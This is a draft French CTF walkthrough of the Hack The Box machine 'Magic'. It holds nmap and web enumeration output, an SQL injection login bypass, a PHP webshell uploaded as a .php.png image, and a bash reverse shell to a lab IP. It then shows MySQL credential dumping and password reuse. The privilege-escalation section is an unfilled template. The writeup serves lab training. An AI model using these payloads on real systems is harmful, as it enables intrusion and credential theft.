---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Magic — HTB Medium Writeup & Walkthrough"
linkTitle: "Magic"
slug: "magic"
date: 2026-06-15T10:06:17+02:00
#lastmod: 2026-06-15T10:06:17+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Medium","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Magic"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Magic"
  difficulty: "Medium"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Magic> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/magic/full_tcp_scan.txt magic.htb
Nmap scan report for magic.htb (10.129x.x)
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.80 seconds

```

### Scan FTP/SMB

Après le scan initial, le script vérifie la présence éventuelle de services **FTP** ou **SMB** afin de lancer une énumération ciblée si nécessaire :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : magic.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour magic.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "magic.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/magic/aggressive_vuln_scan_raw.txt magic.htb
Nmap scan report for magic.htb (10.129.x.x)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.57 ms 10.10.x.1
2   8.05 ms  magic.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.55 seconds
 nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "magic.htb"
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/magic/cms_vuln_scan.txt magic.htb
Nmap scan report for magic.htb (10.129.x.x)
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.29 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 1
|     /assets/css/
|       css: 2
|     /assets/js/
|       js: 6
|     /images/fulls/
|       jpeg: 1; jpg: 4
|     /images/uploads/
|       gif: 1; jpg: 3; png: 1
|   Longest directory structure:
|     Depth: 2
|     Dir: /assets/css/
|   Total files found (by extension):
|_    Other: 1; css: 2; gif: 1; jpeg: 1; jpg: 7; js: 6; php: 1; png: 1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-enum: 
|_  /login.php: Possible admin folder
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 17.11 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/magic/udp_vuln_scan.txt magic.htb
Nmap scan report for magic.htb (10.129x.x)
Host is up (0.012s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.21 seconds

```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb magic.htb --fs 274

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt` regroupe les chemins découverts, ce qui évite de devoir parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : magic.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://magic.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/magic.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://magic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -fs 274 -of json -o scans_recoweb/magic.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/magic.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://magic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -fs 274 -of json -o scans_recoweb/magic.htb/ffuf_files.json 2>&1 | tee scans_recoweb/magic.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://magic.htb/assets/
http://magic.htb/assets/ (CODE:301|SIZE:307)
http://magic.htb/. (CODE:200|SIZE:4051)
http://magic.htb/images/
http://magic.htb/images/ (CODE:301|SIZE:307)
http://magic.htb/index.php (CODE:200|SIZE:4051)
http://magic.htb/index.php (CODE:200|SIZE:4053)
http://magic.htb/login.php (CODE:200|SIZE:4221)
http://magic.htb/logout.php (CODE:302|SIZE:0)
http://magic.htb/server-status (CODE:403|SIZE:274)
http://magic.htb/upload.php (CODE:302|SIZE:2957)

=== Détails par outil ===

[DIRB]
http://magic.htb/assets/
http://magic.htb/images/
http://magic.htb/index.php (CODE:200|SIZE:4053)
http://magic.htb/server-status (CODE:403|SIZE:274)

[FFUF — DIRECTORIES]
http://magic.htb/assets/ (CODE:301|SIZE:307)
http://magic.htb/images/ (CODE:301|SIZE:307)

[FFUF — FILES]
http://magic.htb/. (CODE:200|SIZE:4051)
http://magic.htb/index.php (CODE:200|SIZE:4051)
http://magic.htb/login.php (CODE:200|SIZE:4221)
http://magic.htb/logout.php (CODE:302|SIZE:0)
http://magic.htb/upload.php (CODE:302|SIZE:2957)

```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains magic.htb

=== mon-subdomains magic.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : magic.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=4053 words=207 (Host=sz8lc1zow5.magic.htb)
  Baseline#2: code=200 size=4053 words=207 (Host=dv366unpqe.magic.htb)
  Baseline#3: code=200 size=4052 words=207 (Host=y7ax30z2pn.magic.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains magic.htb END ===


```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

La page d’accueil de Magic présente une galerie d’images déjà uploadées sur le site. L’application semble donc proposer une fonctionnalité d’envoi d’images, mais celle-ci n’est pas directement accessible depuis la page principale.

![Page d’accueil de Magic](magic-home-page.png)

En bas à gauche de la page, un lien discret indique :

```text
Please Login, to upload images.
```

Cet élément est important : il t’apprend que l’upload d’images existe bien, mais qu’il est réservé aux utilisateurs authentifiés.

L’étape suivante consiste donc à ouvrir la page de connexion afin d’identifier le mécanisme qui protège cette fonctionnalité.



<img src="magic-login.png" alt="Formulaire de connexion de Magic" class="img-left-60">

Le formulaire est très simple. Il ne contient que deux champs :

```text
Username
Password
```

Tu as donc une application qui expose une fonctionnalité intéressante, l’upload d’images, mais qui impose d’abord une authentification.

La suite de la prise de pied consiste à étudier ce formulaire de connexion pour tenter d’accéder à cette zone protégée.

### Contournement de l’authentification par injection SQL

Comme tu ne disposes d’aucun identifiant valide, tu peux commencer par tester quelques couples classiques de connexion.

Par exemple :

```text
admin:admin
admin:password
root:root
test:test
```

Ces tentatives ne permettent pas de te connecter. L’application reste sur le formulaire de connexion et affiche un message d’échec.

<img src="magic-wrong-username-or-password.png" alt="Message d’échec de connexion sur Magic" class="img-left-60">

Tu peux ensuite faire un test simple dans le champ `username` en saisissant uniquement une apostrophe :

```text
'
```

Ce test ne provoque pas de message d’erreur visible, mais il reste intéressant. Sur un formulaire de connexion, l’apostrophe est un caractère particulier, car elle peut perturber une requête SQL mal protégée. Même sans erreur affichée, ce type de test te met donc sur la piste d’une possible injection SQL.

Pour rester méthodique, tu peux alors t’appuyer sur une liste publique de payloads classiques de contournement d’authentification par injection SQL, comme la cheat sheet publiée par Penetration Testing Lab :

[SQL Injection Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

Tu testes ensuite les payloads un par un dans le champ `username`, en laissant le champ `password` vide ou avec une valeur quelconque.

Dans ce cas, le premier payload qui fonctionne est :

```
admin' #
```

<img src="magic-injection-sql-simple.png" alt="Injection SQL admin commentée dans le formulaire de connexion Magic" class="img-left-60">

Après validation du formulaire avec ce payload, l’application ne réagit plus comme lors d’un mauvais mot de passe. Cette fois, l’authentification est contournée et tu accèdes à la zone d’upload d’images.

<img src="magic-image-upload.png" alt="Zone d’upload après contournement de l’authentification" class="img-left-60">

La chaîne commence donc par une injection SQL sur le formulaire de connexion :

```text
Injection SQL sur le formulaire de connexion → contournement de l’authentification → accès à la zone d’upload
```

### Transformation de l’upload en exécution de commandes

Une fois connecté à la zone d’upload, l’objectif est de vérifier si le mécanisme d’envoi d’image peut être détourné.

L’application attend normalement un fichier image. L’idée consiste donc à envoyer un fichier qui ressemble à une image du point de vue du formulaire, mais qui contient du code PHP exécutable côté serveur.

Un fichier avec une double extension, par exemple du type `.php.png`, permet de tester ce comportement.

Le contenu PHP utilisé reste volontairement minimal :

```php
<?php system($_GET['cmd']); ?>
```

Ce code exécute la commande passée dans le paramètre `cmd`.

Après l’upload, le fichier est accessible dans le répertoire suivant :

```text
/images/uploads/
```

On peut alors appeler le fichier uploadé en ajoutant un paramètre `cmd` dans l’URL.

Par exemple, pour tester l’exécution de commandes :

```text
http://magic.htb/images/uploads/shell.php.png?cmd=id
```

La réponse confirme l’exécution de commandes côté serveur. Le contexte obtenu est celui de l’utilisateur web :

```text
www-data
```

À ce stade, nous disposons d’un webshell simple permettant d’exécuter des commandes sur la machine cible.

La chaîne devient :

```text
SQL injection → accès upload → fichier PHP déguisé en image → webshell www-data
```

### Obtention d’un reverse shell

Le webshell permet d’exécuter des commandes, mais ce n’est pas très confortable pour travailler. L’étape suivante consiste donc à obtenir un reverse shell vers Kali.

Sur Kali, on commence par mettre en écoute un port avec `nc` :

```bash
nc -lvnp 4444
```

Depuis le webshell, on lance ensuite un reverse shell Bash vers l’adresse VPN de Kali.

Le point important ici est d’utiliser `bash -c` :

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
```

L’utilisation de `bash -c` est importante, car elle force Bash à interpréter lui-même les redirections ainsi que `/dev/tcp`. Sans cela, la commande peut échouer selon le shell réellement utilisé derrière l’appel PHP.

Une fois la commande exécutée depuis le webshell, une connexion arrive sur Kali.

Nous obtenons alors un shell interactif avec le contexte `www-data`.

### Stabilisation du shell

Le reverse shell obtenu fonctionne, mais il reste basique. Pour rendre l’interaction plus confortable, on le stabilise avec la méthode classique.

Dans le shell distant :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ensuite, côté Kali, on suspend le shell avec `Ctrl+Z`, puis on configure le terminal local :

```bash
stty raw -echo; fg
```

Après le retour dans le shell distant, on termine la stabilisation :

```bash
export TERM=xterm
stty rows 40 columns 120
```

À partir de ce moment, le shell est plus agréable à utiliser : l’affichage est meilleur, les commandes interactives fonctionnent mieux, et l’on peut poursuivre l’énumération locale dans de meilleures conditions.

### Recherche des fichiers de configuration

Une fois dans le contexte `www-data`, l’objectif est de comprendre comment l’application web fonctionne et où elle stocke ses informations sensibles.

Comme l’application est hébergée sous `/var/www`, on commence par rechercher les fichiers de configuration et les fichiers liés à une base de données.

La commande générique retenue est :

```bash
find /var/www -type f \( -iname "*config*" -o -iname "*db*" -o -iname "*database*" \) 2>/dev/null
```

Cette recherche permet de découvrir un fichier intéressant :

```text
/var/www/Magic/db.php5
```

On lit ensuite son contenu :

```bash
cat /var/www/Magic/db.php5
```

Le fichier contient des identifiants MySQL utilisés par l’application :

```text
database : Magic
user     : theseus
password : iamkingtheseus
host     : localhost
```

Ces identifiants ne donnent pas encore directement un accès système, mais ils permettent d’interroger la base de données locale.

### Énumération de la base MySQL

Sur la machine cible, le client `mysql` classique n’est pas disponible. En revanche, d’autres outils MySQL sont présents, notamment `mysqlshow` et `mysqldump`.

On peut d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :

```bash
mysqlshow -u theseus -piamkingtheseus Magic
```

L’accès fonctionne et permet d’identifier une table intéressante :

```text
login
```

On utilise ensuite `mysqldump` pour lire le contenu de cette table :

```bash
mysqldump -u theseus -piamkingtheseus Magic login
```

Le dump révèle une entrée contenant les identifiants de connexion de l’application :

```sql
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```

Le mot de passe trouvé est donc :

```text
Th3s3usW4sK1ng
```

### Réutilisation du mot de passe pour devenir theseus

À ce stade, nous avons un mot de passe issu de la base de données de l’application.

Comme l’utilisateur MySQL s’appelle `theseus`, il est logique de tester une éventuelle réutilisation de mot de passe avec l’utilisateur local du même nom.

Depuis le shell `www-data`, on tente donc de changer d’utilisateur :

```bash
su - theseus
```

Lorsque le mot de passe est demandé, on fournit :

```text
Th3s3usW4sK1ng
```

Le changement d’utilisateur fonctionne. Nous passons alors du contexte web `www-data` au compte local `theseus`.

On peut confirmer l’identité courante avec :

```bash
id
```

Nous pouvons ensuite lire le flag utilisateur :

```bash
cat user.txt
```

### Résumé de la chaîne de prise de pied

La prise de pied sur Magic repose sur une chaîne progressive assez classique, mais très pédagogique.

On commence par contourner l’authentification grâce à une injection SQL. Cela donne accès à une fonctionnalité d’upload, qui est ensuite détournée pour envoyer un fichier PHP déguisé en image. Ce fichier devient un webshell permettant d’exécuter des commandes en tant que `www-data`.

À partir de ce webshell, un reverse shell Bash est lancé vers Kali, puis stabilisé. L’énumération locale permet ensuite de découvrir le fichier `/var/www/Magic/db.php5`, qui contient les identifiants MySQL de l’application.

Comme le client `mysql` n’est pas disponible, on utilise `mysqlshow` et `mysqldump` pour explorer la base `Magic`. Le dump de la table `login` révèle un mot de passe, qui est ensuite réutilisé avec succès pour passer sur l’utilisateur local `theseus`.

La chaîne complète est donc :

```text
SQL injection
→ accès à la zone d’upload
→ fichier PHP déguisé en image
→ webshell
→ reverse shell www-data
→ découverte de db.php5
→ accès MySQL
→ dump de la table login
→ réutilisation du mot de passe
→ utilisateur theseus
```

---

## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}

## Escalade de privilèges

### Observation passive avec pspy64

```bash
./pspy64
```

Si système 32 bits :

```bash
./pspy32
```

### Vérification sudo

```bash
sudo -l
```

### Exploration du contexte utilisateur

```bash
whoami
id
pwd
uname -a
hostname
find /home /opt -type f -readable 2>/dev/null
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

### SUID

```bash
python3 suid3num.py
```

Alternative :

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Services locaux

```bash
ss -tulnp
```

Alternative :

```bash
netstat -tulnp
```

### Recherche d’un service derrière un port local

Exemple avec le port `8080` :

```bash
grep -r ':8080' /etc 2>/dev/null
```

Recherche élargie :

```bash
grep -r '8080' /etc 2>/dev/null
```

### Tunnel SSH vers un service local

Exemple avec un service local sur `127.0.0.1:8080` :

```bash
ssh -L 8080:127.0.0.1:8080 user@target
```

Accès depuis Kali :

```text
http://localhost:8080
```

### Linpeas

```bash
./linpeas.sh
```

### Dernier recours : le kernel

```bash
uname -a
./les.sh
```

### Conclusion de l’énumération privilege escalation

À la fin de cette phase, tu peux résumer les pistes testées :

* sudo
* contexte utilisateur
* fichiers lisibles
* capabilities
* SUID
* cron et timers
* services locaux
* LinPEAS
* kernel

Dans ce cas précis, la piste exploitable est :

```text
<résumer ici la piste réellement exploitée>
```

### Exploitation de la piste identifiée

Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.

```bash
<commandes d’exploitation>
```

Tu confirmes l’élévation de privilèges :

```bash
whoami
id
hostname
```

Résultat attendu :

```text
root
uid=0(root) gid=0(root) groups=0(root)
machine
```

### root.txt

Une fois root, tu peux lire le flag final :

```bash
cat /root/root.txt
```

Cette étape termine l’escalade de privilèges.

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}